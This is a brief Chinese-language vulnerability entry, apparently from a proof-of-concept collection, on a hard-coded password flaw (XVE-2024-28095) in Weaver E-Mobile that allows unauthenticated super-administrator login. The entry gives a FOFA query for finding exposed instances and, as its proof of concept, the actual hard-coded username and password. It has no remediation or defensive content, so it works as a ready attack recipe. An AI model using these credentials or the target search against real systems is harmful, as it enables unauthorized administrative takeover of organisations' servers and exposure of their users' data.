# 泛微E-Mobile硬编码口令漏洞(XVE-2024-28095)

泛微E-Mobile 存在硬编码口令漏洞，未经身份验证的远程攻击者可利用该口令以超级管理员身份登录管理后台，导致网站处于极度不安全状态。

## fofa

```javascript
app="泛微-EMobile"
```

## poc

```javascript
账号：msgadmin
密码：Weaver#2012!@#
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272003506.png)

